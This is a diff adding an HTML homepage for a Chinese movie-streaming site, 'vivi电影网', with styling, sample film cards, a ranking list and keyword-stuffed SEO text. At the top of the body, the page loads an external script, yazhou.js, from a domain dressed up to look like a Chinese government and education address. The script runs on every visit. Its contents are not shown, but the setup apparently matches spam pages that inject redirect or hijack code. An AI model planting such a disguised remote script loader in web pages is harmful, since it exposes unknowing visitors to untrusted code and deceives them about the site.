@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vivi电影网 - 高清影视在线观看</title>
+<meta name="description" content="vivi电影网提供最新电影、热播电视剧、经典动漫、热门综艺在线观看，海量高清资源免费畅享。">
+<meta name="keywords" content="vivi电影网,高清电影,在线观看,电视剧,动漫,综艺">
+<meta name="author" content="vivi电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://vividianyingwang-app.github.io">
+<style>
+/* ===== 全局重置与基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:#0a0a0f;
+  color:#e0e0e0;
+  line-height:1.6;
+  overflow-x:hidden;
+  min-height:100vh;
+}
+
+/* ===== 动态背景 ===== */
+body::before{
+  content:'';
+  position:fixed;
+  top:0;left:0;right:0;bottom:0;
+  background:
+    radial-gradient(ellipse at 20% 50%, rgba(120,0,255,0.08) 0%, transparent 60%),
+    radial-gradient(ellipse at 80% 20%, rgba(0,255,200,0.06) 0%, transparent 60%),
+    radial-gradient(ellipse at 50% 80%, rgba(255,0,128,0.04) 0%, transparent 60%);
+  z-index:-1;
+  pointer-events:none;
+}
+
+/* ===== 头部导航 ===== */
+.header{
+  position:fixed;top:0;left:0;right:0;
+  z-index:1000;
+  background:rgba(10,10,15,0.85);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(120,0,255,0.15);
+  transition:all 0.3s ease;
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;
+  padding:0 1.5rem;
+  display:flex;align-items:center;justify-content:space-between;
+  height:64px;
+}
+.logo{
+  font-size:1.5rem;font-weight:800;
+  background:linear-gradient(135deg,#a855f7,#06ffa5);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  letter-spacing:-0.5px;
+  text-decoration:none;
+}
+.nav-links{
+  display:flex;gap:0.5rem;
+  list-style:none;
+}
+.nav-links a{
+  color:#b0b0b0;
+  text-decoration:none;
+  padding:0.5rem 1rem;
+  border-radius:8px;
+  font-size:0.9rem;
+  font-weight:500;
+  transition:all 0.25s ease;
+  position:relative;
+}
+.nav-links a:hover{
+  color:#fff;
+  background:rgba(120,0,255,0.15);
+}
+.nav-links a.active{
+  color:#06ffa5;
+  background:rgba(6,255,165,0.1);
+}
+
+/* 移动端菜单按钮 */
+.menu-toggle{
+  display:none;
+  flex-direction:column;cursor:pointer;gap:4px;
+  padding:8px;
+}
+.menu-toggle span{
+  width:22px;height:2px;
+  background:#a855f7;
+  border-radius:2px;
+  transition:all 0.3s;
+}
+
+/* ===== 主内容区 ===== */
+.main-content{
+  max-width:1200px;
+  margin:0 auto;
+  padding:84px 1.5rem 2rem;
+}
+
+/* ===== Hero 区域 ===== */
+.hero{
+  text-align:center;
+  padding:4rem 0 3rem;
+  position:relative;
+}
+.hero-badge{
+  display:inline-block;
+  padding:0.4rem 1.2rem;
+  border:1px solid rgba(168,85,247,0.4);
+  border-radius:50px;
+  font-size:0.8rem;
+  color:#a855f7;
+  margin-bottom:1.5rem;
+  background:rgba(168,85,247,0.05);
+}
+.hero h1{
+  font-size:clamp(2rem,5vw,3.5rem);
+  font-weight:900;
+  line-height:1.2;
+  margin-bottom:1rem;
+}
+.hero h1 .gradient-text{
+  background:linear-gradient(135deg,#a855f7,#06ffa5,#ff0080);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.hero-sub{
+  font-size:1.1rem;
+  color:#888;
+  max-width:600px;
+  margin:0 auto 2rem;
+}
+.hero-cta{
+  display:inline-flex;align-items:center;gap:0.5rem;
+  padding:0.9rem 2rem;
+  background:linear-gradient(135deg,#7c3aed,#a855f7);
+  color:#fff;
+  text-decoration:none;
+  border-radius:12px;
+  font-weight:600;
+  font-size:1rem;
+  transition:all 0.3s ease;
+  box-shadow:0 4px 20px rgba(124,58,237,0.35);
+}
+.hero-cta:hover{
+  transform:translateY(-2px);
+  box-shadow:0 8px 30px rgba(124,58,237,0.5);
+}
+
+/* ===== 栏目通用样式 ===== */
+.section{
+  padding:3rem 0;
+}
+.section-header{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:1.5rem;
+}
+.section-title{
+  font-size:1.5rem;font-weight:700;
+  color:#fff;
+  display:flex;align-items:center;gap:0.6rem;
+}
+.section-title::before{
+  content:'';
+  width:4px;height:1.5rem;
+  background:linear-gradient(180deg,#a855f7,#06ffa5);
+  border-radius:2px;
+}
+.section-more{
+  color:#a855f7;
+  text-decoration:none;
+  font-size:0.85rem;
+  transition:color 0.2s;
+}
+.section-more:hover{color:#06ffa5}
+
+/* ===== 卡片网格 ===== */
+.card-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(180px,1fr));
+  gap:1.2rem;
+}
+.card{
+  background:rgba(255,255,255,0.03);
+  border:1px solid rgba(255,255,255,0.06);
+  border-radius:16px;
+  overflow:hidden;
+  transition:all 0.35s ease;
+  cursor:pointer;
+  text-decoration:none;
+  display:block;
+}
+.card:hover{
+  transform:translateY(-6px);
+  border-color:rgba(168,85,247,0.3);
+  background:rgba(255,255,255,0.05);
+  box-shadow:0 12px 40px rgba(0,0,0,0.4);
+}
+.card-poster{
+  width:100%;
+  aspect-ratio:3/4;
+  background:linear-gradient(135deg,rgba(124,58,237,0.3),rgba(6,255,165,0.2));
+  display:flex;align-items:center;justify-content:center;
+  position:relative;
+  overflow:hidden;
+}
+.card-poster::after{
+  content:attr(data-title);
+  font-size:0.85rem;
+  color:rgba(255,255,255,0.7);
+  text-align:center;
+  padding:1rem;
+}
+.card-body{padding:0.8rem}
+.card-title{
+  font-size:0.9rem;font-weight:600;
+  color:#e0e0e0;
+  margin-bottom:0.3rem;
+  display:-webkit-box;
+  -webkit-line-clamp:1;
+  -webkit-box-orient:vertical;
+  overflow:hidden;
+}
+.card-meta{
+  font-size:0.75rem;color:#666;
+  display:flex;justify-content:space-between;
+}
+
+/* ===== 栏目2：电影分类 ===== */
+.cat-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(140px,1fr));
+  gap:1rem;
+}
+.cat-item{
+  background:rgba(255,255,255,0.02);
+  border:1px solid rgba(255,255,255,0.05);
+  border-radius:14px;
+  padding:1.5rem 1rem;
+  text-align:center;
+  text-decoration:none;
+  transition:all 0.3s ease;
+}
+.cat-item:hover{
+  background:rgba(168,85,247,0.08);
+  border-color:rgba(168,85,247,0.25);
+  transform:scale(1.03);
+}
+.cat-icon{font-size:2rem;margin-bottom:0.5rem;display:block}
+.cat-name{font-size:0.9rem;color:#ccc;font-weight:500}
+
+/* ===== 栏目3：排行榜 ===== */
+.rank-list{
+  background:rgba(255,255,255,0.02);
+  border:1px solid rgba(255,255,255,0.05);
+  border-radius:16px;
+  overflow:hidden;
+}
+.rank-item{
+  display:flex;align-items:center;gap:1rem;
+  padding:1rem 1.2rem;
+  border-bottom:1px solid rgba(255,255,255,0.04);
+  text-decoration:none;
+  transition:background 0.2s;
+}
+.rank-item:last-child{border-bottom:none}
+.rank-item:hover{background:rgba(255,255,255,0.03)}
+.rank-num{
+  width:28px;height:28px;
+  display:flex;align-items:center;justify-content:center;
+  border-radius:8px;
+  font-size:0.8rem;font-weight:700;
+  flex-shrink:0;
+}
+.rank-num.top1{background:linear-gradient(135deg,#ffd700,#ff8c00);color:#000}
+.rank-num.top2{background:linear-gradient(135deg,#c0c0c0,#888);color:#000}
+.rank-num.top3{background:linear-gradient(135deg,#cd7f32,#a0522d);color:#fff}
+.rank-num.normal{background:rgba(255,255,255,0.06);color:#888}
+.rank-info{flex:1}
+.rank-title{font-size:0.95rem;font-weight:600;color:#e0e0e0;margin-bottom:0.2rem}
+.rank-desc{font-size:0.75rem;color:#666}
+.rank-score{
+  font-size:0.85rem;font-weight:700;
+  color:#06ffa5;
+  flex-shrink:0;
+}
+
+/* ===== 栏目4：关于/底部 ===== */
+.about-section{
+  background:rgba(255,255,255,0.02);
+  border:1px solid rgba(255,255,255,0.05);
+  border-radius:20px;
+  padding:2.5rem;
+  text-align:center;
+}
+.about-section h3{
+  font-size:1.3rem;color:#fff;margin-bottom:1rem;
+}
+.about-section p{
+  color:#888;max-width:600px;margin:0 auto 1.5rem;
+  font-size:0.95rem;
+}
+.footer{
+  text-align:center;
+  padding:2rem 0;
+  border-top:1px solid rgba(255,255,255,0.05);
+  margin-top:3rem;
+}
+.footer p{color:#555;font-size:0.8rem}
+.footer a{color:#a855f7;text-decoration:none}
+
+/* ===== 响应式 ===== */
+@media(max-width:768px){
+  .nav-links{
+    display:none;
+    position:absolute;top:64px;left:0;right:0;
+    background:rgba(10,10,15,0.97);
+    backdrop-filter:blur(20px);
+    flex-direction:column;
+    padding:1rem;
+    border-bottom:1px solid rgba(120,0,255,0.15);
+  }
+  .nav-links.open{display:flex}
+  .nav-links a{padding:0.8rem 1rem}
+  .menu-toggle{display:flex}
+  .card-grid{grid-template-columns:repeat(2,1fr);gap:0.8rem}
+  .cat-grid{grid-template-columns:repeat(3,1fr);gap:0.6rem}
+  .about-section{padding:1.5rem}
+  .hero{padding:2rem 0 1.5rem}
+  .section{padding:2rem 0}
+}
+@media(max-width:480px){
+  .cat-grid{grid-template-columns:repeat(2,1fr)}
+  .rank-item{padding:0.8rem 1rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- ===== 头部导航 ===== -->
+<header class="header">
+  <div class="nav-container">
+    <a href="#" class="logo">vivi电影网</a>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#" class="active">首页</a></li>
+        <li><a href="#movies">电影</a></li>
+        <li><a href="#categories">分类</a></li>
+        <li><a href="#ranking">排行榜</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+    <div class="menu-toggle" id="menuToggle">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<!-- ===== 主内容 ===== -->
+<main class="main-content">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-badge">🎬 vivi电影网 · 全新上线</div>
+    <h1>发现好电影<br><span class="gradient-text">从这里开始</span></h1>
+    <p class="hero-sub">vivi电影网汇聚全球高清影视资源，电影、剧集、动漫、综艺一网打尽，随时随地畅享视听盛宴。</p>
+    <a href="#movies" class="hero-cta">立即探索 →</a>
+  </section>
+
+  <!-- 栏目一：最新电影 -->
+  <section class="section" id="movies">
+    <div class="section-header">
+      <h2 class="section-title">最新上映</h2>
+      <a href="#" class="section-more">查看全部 →</a>
+    </div>
+    <div class="card-grid">
+      <a href="#" class="card">
+        <div class="card-poster" data-title="沙丘2"></div>
+        <div class="card-body">
+          <div class="card-title">沙丘2</div>
+          <div class="card-meta"><span>科幻</span><span>9.2</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster" data-title="奥本海默"></div>
+        <div class="card-body">
+          <div class="card-title">奥本海默</div>
+          <div class="card-meta"><span>传记</span><span>8.9</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster" data-title="坠落的审判"></div>
+        <div class="card-body">
+          <div class="card-title">坠落的审判</div>
+          <div class="card-meta"><span>悬疑</span><span>8.7</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster" data-title="美国小说"></div>
+        <div class="card-body">
+          <div class="card-title">美国小说</div>
+          <div class="card-meta"><span>喜剧</span><span>8.4</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster" data-title="哥斯拉2"></div>
+        <div class="card-body">
+          <div class="card-title">哥斯拉2</div>
+          <div class="card-meta"><span>动作</span><span>7.8</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster" data-title="花月杀手"></div>
+        <div class="card-body">
+          <div class="card-title">花月杀手</div>
+          <div class="card-meta"><span>犯罪</span><span>8.2</span></div>
+        </div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 栏目二：电影分类 -->
+  <section class="section" id="categories">
+    <div class="section-header">
+      <h2 class="section-title">电影分类</h2>
+      <a href="#" class="section-more">更多分类 →</a>
+    </div>
+    <div class="cat-grid">
+      <a href="#" class="cat-item">
+        <span class="cat-icon">🔥</span>
+        <span class="cat-name">动作片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">😂</span>
+        <span class="cat-name">喜剧片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">🎭</span>
+        <span class="cat-name">爱情片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">👻</span>
+        <span class="cat-name">恐怖片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">🚀</span>
+        <span class="cat-name">科幻片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">🎬</span>
+        <span class="cat-name">剧情片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">🎯</span>
+        <span class="cat-name">悬疑片</span>
+      </a>
+      <a href="#" class="cat-item">
+        <span class="cat-icon">📜</span>
+        <span class="cat-name">历史片</span>
+      </a>
+    </div>
+  </section>
+
+  <!-- 栏目三：排行榜 -->
+  <section class="section" id="ranking">
+    <div class="section-header">
+      <h2 class="section-title">热门排行榜</h2>
+      <a href="#" class="section-more">完整榜单 →</a>
+    </div>
+    <div class="rank-list">
+      <a href="#" class="rank-item">
+        <div class="rank-num top1">1</div>
+        <div class="rank-info">
+          <div class="rank-title">肖申克的救赎</div>
+          <div class="rank-desc">剧情 · 1994 · vivi电影网推荐</div>
+        </div>
+        <div class="rank-score">9.7</div>
+      </a>
+      <a href="#" class="rank-item">
+        <div class="rank-num top2">2</div>
+        <div class="rank-info">
+          <div class="rank-title">阿甘正传</div>
+          <div class="rank-desc">剧情 · 1994 · vivi电影网推荐</div>
+        </div>
+        <div class="rank-score">9.5</div>
+      </a>
+      <a href="#" class="rank-item">
+        <div class="rank-num top3">3</div>
+        <div class="rank-info">
+          <div class="rank-title">泰坦尼克号</div>
+          <div class="rank-desc">爱情 · 1997 · vivi电影网推荐</div>
+        </div>
+        <div class="rank-score">9.4</div>
+      </a>
+      <a href="#" class="rank-item">
+        <div class="rank-num normal">4</div>
+        <div class="rank-info">
+          <div class="rank-title">盗梦空间</div>
+          <div class="rank-desc">科幻 · 2010 · vivi电影网推荐</div>
+        </div>
+        <div class="rank-score">9.3</div>
+      </a>
+      <a href="#" class="rank-item">
+        <div class="rank-num normal">5</div>
+        <div class="rank-info">
+          <div class="rank-title">星际穿越</div>
+          <div class="rank-desc">科幻 · 2014 · vivi电影网推荐</div>
+        </div>
+        <div class="rank-score">9.3</div>
+      </a>
+      <a href="#" class="rank-item">
+        <div class="rank-num normal">6</div>
+        <div class="rank-info">
+          <div class="rank-title">楚门的世界</div>
+          <div class="rank-desc">剧情 · 1998 · vivi电影网推荐</div>
+        </div>
+        <div class="rank-score">9.2</div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 栏目四：关于 vivi电影网 -->
+  <section class="section" id="about">
+    <div class="about-section">
+      <h3>关于 vivi电影网</h3>
+      <p>
+        vivi电影网（https://vividianyingwang-app.github.io）是一个专注于高清影视资源分享的在线平台。
+        我们致力于为影迷提供最新、最全的电影资讯和观看指南，涵盖动作、喜剧、爱情、科幻、悬疑等多种类型。
+        无论你是资深影迷还是偶尔观影，vivi电影网都能为你推荐最适合的精彩内容。
+      </p>
+      <p style="color:#555;font-size:0.85rem;">
+        © 2024 vivi电影网. All rights reserved. | 关键词：vivi电影网 高清影视 在线观看
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<!-- ===== 底部 ===== -->
+<footer class="footer">
+  <p>
+    <a href="https://vividianyingwang-app.github.io">vivi电影网</a> |
+    <a href="#">关于我们</a> |
+    <a href="#">免责声明</a> |
+    <a href="#">联系我们</a>
+  </p>
+  <p style="margin-top:0.5rem;">网站名称：vivi电影网 | 网址：https://vividianyingwang-app.github.io</p>
+</footer>
+
+<script>
+// 移动端菜单切换
+const menuToggle=document.getElementById('menuToggle');
+const navLinks=document.getElementById('navLinks');
+menuToggle.addEventListener('click',()=>{
+  navLinks.classList.toggle('open');
+});
+
+// 导航高亮
+const links=document.querySelectorAll('.nav-links a');
+links.forEach(link=>{
+  link.addEventListener('click',()=>{
+    links.forEach(l=>l.classList.remove('active'));
+    link.classList.add('active');
+    navLinks.classList.remove('open');
+  });
+});
+
+// 滚动时头部阴影
+window.addEventListener('scroll',()=>{
+  const header=document.querySelector('.header');
+  if(window.scrollY>20){
+    header.style.boxShadow='0 2px 20px rgba(0,0,0,0.5)';
+  }else{
+    header.style.boxShadow='none';
+  }
+});
+</script>
+
+</body>
+</html>
